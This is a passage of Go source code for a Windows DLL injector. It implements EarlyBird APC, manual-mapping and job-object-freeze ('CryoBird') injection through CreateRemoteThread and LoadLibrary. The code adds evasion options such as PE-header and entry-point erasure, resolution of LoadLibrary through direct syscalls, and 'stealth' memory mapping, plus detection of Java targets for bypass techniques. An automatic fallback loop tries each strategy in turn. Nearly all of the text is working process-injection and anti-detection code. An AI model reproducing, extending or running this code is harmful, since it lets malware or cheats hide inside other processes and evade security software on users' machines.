			i.logger.Warn("Failed to queue EarlyBird APC",
				"thread", fmt.Sprintf("0x%X", threadHandle),
				"error", err)
		}
	}

	if successCount == 0 {
		return fmt.Errorf("failed to queue APC to any thread")
	}

	time.Sleep(100 * time.Millisecond)

	if i.bypassOptions.ErasePEHeader || i.bypassOptions.EraseEntryPoint {
		i.logger.Info("Applying post-injection anti-detection techniques for EarlyBird APC")

		time.Sleep(1 * time.Second)

		dllBaseAddress, err := i.findLoadedDLLBaseAddress(hProcess, absPath)
		if err != nil {
			i.logger.Warn("Could not find loaded DLL base address", "error", err)
		} else {

			if i.bypassOptions.ErasePEHeader {
				if err := ErasePEHeader(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase PE header", "error", err)
				} else {
					i.logger.Info("PE header erased successfully")
				}
			}

			if i.bypassOptions.EraseEntryPoint {
				if err := EraseEntryPoint(hProcess, dllBaseAddress); err != nil {
					i.logger.Warn("Failed to erase entry point", "error", err)
				} else {
					i.logger.Info("Entry point erased successfully")
				}
			}
		}
	}

	i.logger.Info("EarlyBird APC injection completed",
		"successful_apc_count", successCount,
		"total_threads", len(suspendedThreads))

	return nil
}

func (i *Injector) dllNotificationInject() error {
	i.logger.Info("Using DLL notification injection method")



	hProcess, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS,
		false, i.processID)
	if err != nil {
		i.logger.Error("Failed to open target process", "error", err)
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	absPath, err := filepath.Abs(i.dllPath)
	if err != nil {
		absPath = i.dllPath
	}








	i.logger.Info("Implementing DLL notification via manual mapping")

	dllBytes, err := os.ReadFile(absPath)
	if err != nil {
		i.logger.Error("Failed to read DLL file", "error", err)
		return fmt.Errorf("failed to read DLL file: %v", err)
	}

	baseAddress, err := i.manualMapDLLWithOptions(hProcess, dllBytes)
	if err != nil {
		i.logger.Error("Manual mapping failed", "error", err)
		return fmt.Errorf("manual mapping failed: %v", err)
	}

	i.logger.Info("DLL notification injection successful", "base_address", fmt.Sprintf("0x%X", baseAddress))

	if i.useEnhancedOptions {
		err = i.applyEnhancedInjectionTechniques(hProcess, baseAddress, uintptr(len(dllBytes)), dllBytes)
		if err != nil {
			i.logger.Warn("Enhanced techniques failed", "error", err)
		}
	}

	return nil
}

func (i *Injector) cryoBirdInject() error {
	i.logger.Info("Using CryoBird (job object freeze) injection method")

	jobHandle, err := CreateJobObject(nil, nil)
	if err != nil {
		i.logger.Error("Failed to create job object", "error", err)
		return fmt.Errorf("failed to create job object: %v", err)
	}
	defer windows.CloseHandle(jobHandle)

	err = i.configureJobObjectForSuspension(jobHandle)
	if err != nil {
		i.logger.Error("Failed to configure job object", "error", err)
		return fmt.Errorf("failed to configure job object: %v", err)
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_ALL_ACCESS,
		false, i.processID)
	if err != nil {
		i.logger.Error("Failed to open target process", "error", err)
		return fmt.Errorf("failed to open target process: %v", err)
	}
	defer windows.CloseHandle(hProcess)

	err = AssignProcessToJobObject(jobHandle, hProcess)
	if err != nil {
		i.logger.Error("Failed to assign process to job", "error", err)
		return fmt.Errorf("failed to assign process to job: %v", err)
	}

	i.logger.Info("Process frozen in job object, performing injection")

	defer func() {
		err := TerminateJobObject(jobHandle, 0)
		if err != nil {
			i.logger.Warn("Failed to terminate job object", "error", err)
		} else {
			i.logger.Info("Process unfrozen")
		}
	}()


	absPath, err := filepath.Abs(i.dllPath)
	if err != nil {
		absPath = i.dllPath
	}

	dllPathBytes := []byte(absPath + "\x00")
	pathSize := len(dllPathBytes)

	memAddr, err := VirtualAllocEx(hProcess, 0, uintptr(pathSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		i.logger.Error("Failed to allocate memory", "error", err)
		return fmt.Errorf("failed to allocate memory: %v", err)
	}

	defer func() {
		if memAddr != 0 {
			VirtualFreeEx(hProcess, memAddr, 0, windows.MEM_RELEASE)
			i.logger.Debug("Freed allocated memory", "address", fmt.Sprintf("0x%X", memAddr))
		}
	}()

	var bytesWritten uintptr
	err = WriteProcessMemory(hProcess, memAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(pathSize), &bytesWritten)
	if err != nil {
		i.logger.Error("Failed to write DLL path", "error", err)
		return fmt.Errorf("failed to write DLL path: %v", err)
	}

	loadLibraryAddr, err := i.resolveLoadLibraryAddress()
	if err != nil {
		return fmt.Errorf("failed to resolve LoadLibrary address: %v", err)
	}

	var threadID uint32
	threadHandle, err := CreateRemoteThread(hProcess, nil, 0, loadLibraryAddr, memAddr, 0, &threadID)
	if err != nil {
		i.logger.Error("Failed to create remote thread", "error", err)
		return fmt.Errorf("failed to create remote thread: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	i.logger.Info("Created remote thread while process frozen", "thread_id", threadID)

	waitResult, err := windows.WaitForSingleObject(threadHandle, 15000)
	if err != nil {
		return fmt.Errorf("failed to wait for thread: %v", err)
	}

	if waitResult == uint32(windows.WAIT_TIMEOUT) {
		return fmt.Errorf("thread execution timed out")
	}

	var exitCode uint32
	ret, _, _ := procGetExitCodeThread.Call(uintptr(threadHandle), uintptr(unsafe.Pointer(&exitCode)))
	if ret == 0 || exitCode == 0 {
		return fmt.Errorf("DLL loading failed - LoadLibrary returned NULL")
	}

	dllBaseAddress := uintptr(exitCode)
	i.logger.Info("DLL loaded successfully while frozen", "base_address", fmt.Sprintf("0x%X", dllBaseAddress))

	i.logger.Info("CryoBird injection successful")
	return nil
}


func (i *Injector) findAlertableThreads() ([]windows.Handle, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var alertableThreads []windows.Handle
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	err = windows.Thread32First(snapshot, &te)
	if err != nil {
		return nil, err
	}

	for {
		if te.OwnerProcessID == i.processID {

			threadHandle, err := windows.OpenThread(
				windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME|
					windows.THREAD_GET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID)

			if err == nil {
				alertableThreads = append(alertableThreads, threadHandle)
				i.logger.Info("Found thread for APC", "thread_id", te.ThreadID)
			} else {
				i.logger.Warn("Failed to open thread", "thread_id", te.ThreadID, "error", err)
			}
		}

		err = windows.Thread32Next(snapshot, &te)
		if err != nil {
			break
		}
	}

	return alertableThreads, nil
}

func (i *Injector) makeThreadsAlertable() ([]windows.Handle, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var alertableThreads []windows.Handle
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	err = windows.Thread32First(snapshot, &te)
	if err != nil {
		return nil, err
	}

	for {
		if te.OwnerProcessID == i.processID {
			threadHandle, err := windows.OpenThread(
				windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME|
					windows.THREAD_GET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID)

			if err == nil {

				suspendCount, _, _ := procSuspendThread.Call(uintptr(threadHandle))
				if suspendCount != 0xFFFFFFFF {
					windows.ResumeThread(threadHandle)
					alertableThreads = append(alertableThreads, threadHandle)
					i.logger.Info("Made thread alertable", "thread_id", te.ThreadID)
				} else {
					windows.CloseHandle(threadHandle)
				}
			}
		}

		err = windows.Thread32Next(snapshot, &te)
		if err != nil {
			break
		}
	}

	return alertableThreads, nil
}

func (i *Injector) triggerAPCExecution() error {

	user32 := windows.NewLazySystemDLL("user32.dll")
	postMessage := user32.NewProc("PostMessageW")

	hWnd, err := i.findProcessMainWindow()
	if err == nil && hWnd != 0 {

		messages := []uint32{0x0000, 0x0001, 0x0002, 0x0400}

		for _, msg := range messages {
			postMessage.Call(uintptr(hWnd), uintptr(msg), 0, 0)
		}

		i.logger.Info("Sent trigger messages to main window", "hwnd", fmt.Sprintf("0x%X", hWnd))
	}

	return nil
}

func (i *Injector) findProcessMainWindow() (uintptr, error) {


	user32 := windows.NewLazySystemDLL("user32.dll")
	findWindow := user32.NewProc("FindWindowW")

	hWnd, _, _ := findWindow.Call(0, 0)
	return hWnd, nil
}

func (i *Injector) suspendAllThreads() ([]windows.Handle, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var suspendedThreads []windows.Handle
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	err = windows.Thread32First(snapshot, &te)
	if err != nil {
		return nil, err
	}

	for {
		if te.OwnerProcessID == i.processID {
			threadHandle, err := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID)

			if err == nil {
				suspendCount, _, _ := procSuspendThread.Call(uintptr(threadHandle))
				if suspendCount != 0xFFFFFFFF {
					suspendedThreads = append(suspendedThreads, threadHandle)
					i.logger.Info("Suspended thread", "thread_id", te.ThreadID)
				} else {
					windows.CloseHandle(threadHandle)
				}
			} else {
				i.logger.Warn("Failed to open thread for suspension", "thread_id", te.ThreadID, "error", err)
			}
		}

		err = windows.Thread32Next(snapshot, &te)
		if err != nil {
			break
		}
	}

	return suspendedThreads, nil
}

func (i *Injector) configureJobObjectForSuspension(jobHandle windows.Handle) error {
	i.logger.Info("Configuring job object for process suspension")

	type JobObjectBasicLimitInformation struct {
		PerProcessUserTimeLimit uint64
		PerJobUserTimeLimit     uint64
		LimitFlags              uint32
		MinimumWorkingSetSize   uintptr
		MaximumWorkingSetSize   uintptr
		ActiveProcessLimit      uint32
		Affinity                uintptr
		PriorityClass           uint32
		SchedulingClass         uint32
	}

	var basicLimits JobObjectBasicLimitInformation
	basicLimits.LimitFlags = 0x00000020
	basicLimits.ActiveProcessLimit = 1

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	setInformationJobObject := kernel32.NewProc("SetInformationJobObject")

	ret, _, _ := setInformationJobObject.Call(
		uintptr(jobHandle),
		2,
		uintptr(unsafe.Pointer(&basicLimits)),
		unsafe.Sizeof(basicLimits),
	)

	if ret == 0 {
		return fmt.Errorf("failed to configure job object limits")
	}

	i.logger.Info("Job object configured successfully for process suspension")
	return nil
}

func (i *Injector) resolveLoadLibraryAddress() (uintptr, error) {
	if i.bypassOptions.DirectSyscalls {

		return i.resolveLoadLibraryViaSyscalls()
	}

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	return loadLibraryA.Addr(), nil
}

func (i *Injector) resolveLoadLibraryViaSyscalls() (uintptr, error) {
	i.logger.Info("Resolving LoadLibrary via direct syscalls")


	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ldrGetProcedureAddress := ntdll.NewProc("LdrGetProcedureAddress")

	kernel32Handle, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		i.logger.Warn("Failed to get kernel32 handle, using standard method")
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		loadLibraryA := kernel32.NewProc("LoadLibraryA")
		return loadLibraryA.Addr(), nil
	}

	functionName := "LoadLibraryA"
	var ansiString struct {
		Length        uint16
		MaximumLength uint16
		Buffer        *byte
	}

	functionNameBytes := []byte(functionName)
	ansiString.Length = uint16(len(functionNameBytes))
	ansiString.MaximumLength = uint16(len(functionNameBytes))
	ansiString.Buffer = &functionNameBytes[0]

	var functionAddr uintptr

	ret, _, _ := ldrGetProcedureAddress.Call(
		uintptr(kernel32Handle),
		uintptr(unsafe.Pointer(&ansiString)),
		0,
		uintptr(unsafe.Pointer(&functionAddr)),
	)

	if ret != 0 || functionAddr == 0 {
		i.logger.Warn("LdrGetProcedureAddress failed, using standard method")
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		loadLibraryA := kernel32.NewProc("LoadLibraryA")
		return loadLibraryA.Addr(), nil
	}

	i.logger.Info("Successfully resolved LoadLibraryA via LdrGetProcedureAddress",
		"address", fmt.Sprintf("0x%X", functionAddr))

	return functionAddr, nil
}


var (
	kernel32                     = windows.NewLazySystemDLL("kernel32.dll")
	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx            = kernel32.NewProc("VirtualFreeEx")
	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread       = kernel32.NewProc("CreateRemoteThread")
	procCreateJobObjectW         = kernel32.NewProc("CreateJobObjectW")
	procAssignProcessToJobObject = kernel32.NewProc("AssignProcessToJobObject")
	procTerminateJobObject       = kernel32.NewProc("TerminateJobObject")
	procGetExitCodeThread        = kernel32.NewProc("GetExitCodeThread")
	procSuspendThread            = kernel32.NewProc("SuspendThread")
)

func VirtualAllocEx(hProcess windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	ret, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

func VirtualFreeEx(hProcess windows.Handle, lpAddress uintptr, dwSize uintptr, dwFreeType uint32) error {
	ret, _, err := procVirtualFreeEx.Call(
		uintptr(hProcess),
		lpAddress,
		dwSize,
		uintptr(dwFreeType))
	if ret == 0 {
		return err
	}
	return nil
}

func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, lpBuffer unsafe.Pointer, nSize uintptr, lpNumberOfBytesWritten *uintptr) error {
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		lpBaseAddress,
		uintptr(lpBuffer),
		nSize,
		uintptr(unsafe.Pointer(lpNumberOfBytesWritten)))
	if ret == 0 {
		return err
	}
	return nil
}

func CreateRemoteThread(hProcess windows.Handle, lpThreadAttributes unsafe.Pointer, dwStackSize uintptr, lpStartAddress uintptr, lpParameter uintptr, dwCreationFlags uint32, lpThreadId *uint32) (windows.Handle, error) {
	ret, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		uintptr(lpThreadAttributes),
		dwStackSize,
		lpStartAddress,
		lpParameter,
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(lpThreadId)))
	if ret == 0 {
		return 0, err
	}
	return windows.Handle(ret), nil
}

func CreateJobObject(lpJobAttributes unsafe.Pointer, lpName unsafe.Pointer) (windows.Handle, error) {
	ret, _, err := procCreateJobObjectW.Call(
		uintptr(lpJobAttributes),
		uintptr(lpName))
	if ret == 0 {
		return 0, err
	}
	return windows.Handle(ret), nil
}

func AssignProcessToJobObject(hJob windows.Handle, hProcess windows.Handle) error {
	ret, _, err := procAssignProcessToJobObject.Call(
		uintptr(hJob),
		uintptr(hProcess))
	if ret == 0 {
		return err
	}
	return nil
}

func TerminateJobObject(hJob windows.Handle, uExitCode uint32) error {
	ret, _, err := procTerminateJobObject.Call(
		uintptr(hJob),
		uintptr(uExitCode))
	if ret == 0 {
		return err
	}
	return nil
}

func (i *Injector) findMainThreadID() (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	err = windows.Thread32First(snapshot, &te)
	if err != nil {
		return 0, err
	}

	for {
		if te.OwnerProcessID == i.processID {
			i.logger.Info("Found main thread", "thread_id", te.ThreadID)
			return te.ThreadID, nil
		}

		err = windows.Thread32Next(snapshot, &te)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("no threads found for process %d", i.processID)
}

func (i *Injector) validateTargetProcess() error {
	i.logger.Info("Validating target process", "pid", i.processID)

	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, i.processID)
	if err != nil {
		i.logger.Error("Cannot access target process", "error", err)
		return fmt.Errorf("cannot access target process %d: %v", i.processID, err)
	}
	defer windows.CloseHandle(hProcess)

	var exitCode uint32
	err = windows.GetExitCodeProcess(hProcess, &exitCode)
	if err == nil && exitCode != 259 {
		return fmt.Errorf("target process %d has exited (exit code: %d)", i.processID, exitCode)
	}

	is64Bit, err := IsProcess64Bit(i.processID)
	if err != nil {
		return fmt.Errorf("failed to determine process architecture: %v", err)
	}

	currentArch := "32-bit"
	if unsafe.Sizeof(uintptr(0)) == 8 {
		currentArch = "64-bit"
	}

	targetArch := "32-bit"
	if is64Bit {
		targetArch = "64-bit"
	}

	i.logger.Info("Target process validation successful",
		"target_arch", targetArch,
		"current_arch", currentArch)

	return nil
}

func (i *Injector) validateDLLArchitecture() error {
	i.logger.Info("Validating DLL architecture", "dll", i.dllPath)

	dllBytes, err := os.ReadFile(i.dllPath)
	if err != nil {
		return fmt.Errorf("failed to read DLL file: %v", err)
	}

	if len(dllBytes) < 64 {
		return fmt.Errorf("file too small to be a valid PE")
	}

	if dllBytes[0] != 'M' || dllBytes[1] != 'Z' {
		return fmt.Errorf("invalid DOS signature")
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dllBytes[60]))
	if peOffset >= uint32(len(dllBytes)) || peOffset < 64 {
		return fmt.Errorf("invalid PE offset: %d", peOffset)
	}

	if peOffset+4 > uint32(len(dllBytes)) {
		return fmt.Errorf("PE signature out of bounds")
	}

	if dllBytes[peOffset] != 'P' || dllBytes[peOffset+1] != 'E' {
		return fmt.Errorf("invalid PE signature")
	}

	if peOffset+24 > uint32(len(dllBytes)) {
		return fmt.Errorf("machine type out of bounds")
	}

	machine := *(*uint16)(unsafe.Pointer(&dllBytes[peOffset+4]))

	var dllArch string
	switch machine {
	case 0x14c:
		dllArch = "32-bit"
	case 0x8664:
		dllArch = "64-bit"
	default:
		dllArch = fmt.Sprintf("unknown (0x%x)", machine)
	}

	i.logger.Info("DLL architecture detected", "architecture", dllArch, "machine_type", fmt.Sprintf("0x%x", machine))

	if peOffset+22 >= uint32(len(dllBytes)) {
		return fmt.Errorf("characteristics beyond file end")
	}

	characteristics := *(*uint16)(unsafe.Pointer(&dllBytes[peOffset+22]))
	isDll := characteristics&0x2000 != 0

	if !isDll {
		i.logger.Warn("File does not have DLL characteristic flag set")
	}

	i.logger.Info("DLL validation completed", "is_dll", isDll)
	return nil
}

func (i *Injector) attemptInjectionWithRecovery(dllBytes []byte) error {
	i.logger.Info("Starting injection with automatic recovery enabled")

	strategies := i.buildInjectionStrategies(dllBytes)

	var lastError error
	var attemptedMethods []string

	for idx, strategy := range strategies {
		i.logger.Info("Attempting injection strategy", "index", idx+1, "total", len(strategies),
			"method", strategy.Name, "description", strategy.Description)

		originalMethod := i.method
		originalBypass := i.bypassOptions

		i.method = strategy.Method
		i.bypassOptions = strategy.BypassOptions

		err := i.executeInjectionStrategy(strategy, dllBytes)

		attemptedMethods = append(attemptedMethods, strategy.Name)

		if err == nil {
			i.logger.Info("Injection successful with strategy", "method", strategy.Name,
				"attempts", len(attemptedMethods))
			return nil
		}

		i.logger.Warn("Injection strategy failed", "method", strategy.Name, "error", err)
		lastError = err

		i.method = originalMethod
		i.bypassOptions = originalBypass

		if !i.shouldContinueRecovery(err, idx, len(strategies)) {
			i.logger.Info("Stopping recovery attempts", "reason", "non-recoverable error or strategy limit")
			break
		}

		time.Sleep(100 * time.Millisecond)
	}

	return fmt.Errorf("all injection strategies failed (tried: %v). Last error: %v",
		attemptedMethods, lastError)
}

type InjectionStrategy struct {
	Name          string
	Description   string
	Method        InjectionMethod
	BypassOptions BypassOptions
	Priority      int
	Compatibility []string
}

func (i *Injector) buildInjectionStrategies(dllBytes []byte) []InjectionStrategy {
	i.logger.Info("Building injection strategies with automatic architecture optimization")

	var strategies []InjectionStrategy

	archCompat, err := ValidateDLLCompatibility(i.processID, dllBytes)
	if err != nil {
		i.logger.Warn("Could not detect architecture for strategy optimization", "error", err)

	} else {
		i.logger.Info("Architecture-aware strategy building",
			"process_arch", archCompat.ProcessArch.ProcessArch,
			"dll_arch", archCompat.DLLArch.Architecture,
			"is_wow64", archCompat.ProcessArch.IsWow64)
	}

	if i.shouldTryMethod(i.method) {
		strategies = append(strategies, InjectionStrategy{
			Name:          fmt.Sprintf("User Preferred (%s)", methodToString(i.method)),
			Description:   "User's originally selected injection method",
			Method:        i.method,
			BypassOptions: i.bypassOptions,
			Priority:      10,
			Compatibility: []string{"all"},
		})
	}

	if archCompat != nil && archCompat.Compatible {

		if !i.bypassOptions.MemoryLoad && i.shouldTryMethod(StandardInjection) {
			priority := 9
			description := "Memory-only loading with standard injection"

			if archCompat.ProcessArch.IsWow64 {
				priority = 10
				description += " (optimized for WOW64)"
			}

			strategies = append(strategies, InjectionStrategy{
				Name:        "Architecture-Optimized Memory Load",
				Description: description,
				Method:      StandardInjection,
				BypassOptions: BypassOptions{
					MemoryLoad:      true,
					ErasePEHeader:   false,
					EraseEntryPoint: false,
					DirectSyscalls:  i.bypassOptions.DirectSyscalls,
				},
				Priority:      priority,
				Compatibility: []string{"architecture-optimized", "stable"},
			})
		}

		if !i.bypassOptions.ManualMapping && i.shouldTryMethod(StandardInjection) {
			priority := 8
			description := "Manual PE mapping without Windows loader"

			if archCompat.ProcessArch.Is64Bit && !archCompat.ProcessArch.IsWow64 {
				priority = 9
				description += " (optimized for native 64-bit)"
			}

			strategies = append(strategies, InjectionStrategy{
				Name:        "Architecture-Aware Manual Mapping",
				Description: description,
				Method:      StandardInjection,
				BypassOptions: BypassOptions{
					ManualMapping:   true,
					InvisibleMemory: true,
					DirectSyscalls:  true,
				},
				Priority:      priority,
				Compatibility: []string{"advanced", "stealth", "architecture-aware"},
			})
		}

	}

	if i.shouldTryMethod(StandardInjection) {
		strategies = append(strategies, InjectionStrategy{
			Name:          "Universal Standard Injection",
			Description:   "Basic CreateRemoteThread injection (maximum compatibility)",
			Method:        StandardInjection,
			BypassOptions: BypassOptions{

			},
			Priority:      5,
			Compatibility: []string{"basic", "compatible", "universal"},
		})
	}

	strategies = append(strategies, InjectionStrategy{
		Name:        "Auto-Recovery Minimal",
		Description: "Standard injection with automatic error recovery (last resort)",
		Method:      StandardInjection,
		BypassOptions: BypassOptions{
			SkipDllMain: true,
		},
		Priority:      1,
		Compatibility: []string{"last-resort", "minimal", "auto-recovery"},
	})

	for i := 0; i < len(strategies)-1; i++ {
		for j := i + 1; j < len(strategies); j++ {
			if strategies[i].Priority < strategies[j].Priority {
				strategies[i], strategies[j] = strategies[j], strategies[i]
			}
		}
	}

	i.logger.Info("Built architecture-aware injection strategies", "count", len(strategies))
	for idx, strategy := range strategies {
		i.logger.Debug("Strategy order", "rank", idx+1, "name", strategy.Name,
			"priority", strategy.Priority, "compatibility", strategy.Compatibility)
	}

	return strategies
}

func (i *Injector) shouldTryMethod(method InjectionMethod) bool {


	return true
}

func (i *Injector) executeInjectionStrategy(strategy InjectionStrategy, dllBytes []byte) error {
	i.logger.Info("Executing injection strategy", "name", strategy.Name, "method", methodToString(strategy.Method))

	if strategy.BypassOptions.MemoryLoad {
		return i.memoryLoadDLL(dllBytes)
	} else if strategy.BypassOptions.ManualMapping {

		return i.manualMapDLL(dllBytes)
	} else if strategy.BypassOptions.PathSpoofing {

		return i.spoofDLLPath()
	} else if strategy.BypassOptions.LegitProcessInjection {

		return i.legitProcessInject(dllBytes)
	} else {

		if strategy.Method == StandardInjection {
			return i.standardInject()
		}
		return fmt.Errorf("unsupported injection method: %d (only StandardInjection is supported)", strategy.Method)
	}
}

func (i *Injector) shouldContinueRecovery(err error, attemptIndex, totalAttempts int) bool {

	if attemptIndex >= totalAttempts-1 {
		return false
	}

	if strings.Contains(err.Error(), "access denied") ||
		strings.Contains(err.Error(), "process not found") ||
		strings.Contains(err.Error(), "target process has exited") {
		i.logger.Info("Stopping recovery due to critical error", "error", err)
		return false
	}

	if attemptIndex >= 5 {
		i.logger.Info("Stopping recovery due to attempt limit", "attempts", attemptIndex+1)
		return false
	}

	return true
}

// isJavaProcess checks if the target process is a Java process
// This is used to determine if JVMTI bypass techniques should be applied
func (i *Injector) isJavaProcess() bool {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, i.processID)
	if err != nil {
		i.logger.Debug("Failed to open process for Java detection", "error", err)
		return false
	}
	defer windows.CloseHandle(hProcess)

	// Get process image name
	var processName string
	psapi := windows.NewLazySystemDLL("psapi.dll")
	getModuleFileNameEx := psapi.NewProc("GetModuleFileNameExW")

	var moduleName [260]uint16
	ret, _, _ := getModuleFileNameEx.Call(
		uintptr(hProcess),
		0,
		uintptr(unsafe.Pointer(&moduleName[0])),
		uintptr(len(moduleName)),
	)

	if ret != 0 {
		processName = windows.UTF16ToString(moduleName[:])
		processName = strings.ToLower(processName)
		
		// Check for common Java process names
		javaIndicators := []string{
			"java.exe",
			"javaw.exe",
			"javaws.exe",
			"jvm.dll",
			"jvmti",
		}
		
		for _, indicator := range javaIndicators {
			if strings.Contains(processName, indicator) {
				i.logger.Info("Java process detected", "process_name", processName)
				return true
			}
		}
	}

	// Check loaded modules for Java-related DLLs
	var moduleHandle windows.Handle
	var cbNeeded uint32
	var modules [1024]windows.Handle

	enumProcessModules := psapi.NewProc("EnumProcessModules")
	ret, _, _ = enumProcessModules.Call(
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&modules[0])),
		uintptr(len(modules)*int(unsafe.Sizeof(moduleHandle))),
		uintptr(unsafe.Pointer(&cbNeeded)),
	)

	if ret != 0 {
		moduleCount := cbNeeded / uint32(unsafe.Sizeof(moduleHandle))
		getModuleBaseName := psapi.NewProc("GetModuleBaseNameW")

		for j := uint32(0); j < moduleCount && j < uint32(len(modules)); j++ {
			var moduleName [260]uint16
			ret, _, _ := getModuleBaseName.Call(
				uintptr(hProcess),
				uintptr(modules[j]),
				uintptr(unsafe.Pointer(&moduleName[0])),
				uintptr(len(moduleName)),
			)

			if ret != 0 {
				moduleNameStr := strings.ToLower(windows.UTF16ToString(moduleName[:]))
				if strings.Contains(moduleNameStr, "jvm") ||
					strings.Contains(moduleNameStr, "java") ||
					strings.Contains(moduleNameStr, "jvmti") {
					i.logger.Info("Java process detected via loaded module", "module", moduleNameStr)
					return true
				}
			}
		}
	}

	return false
}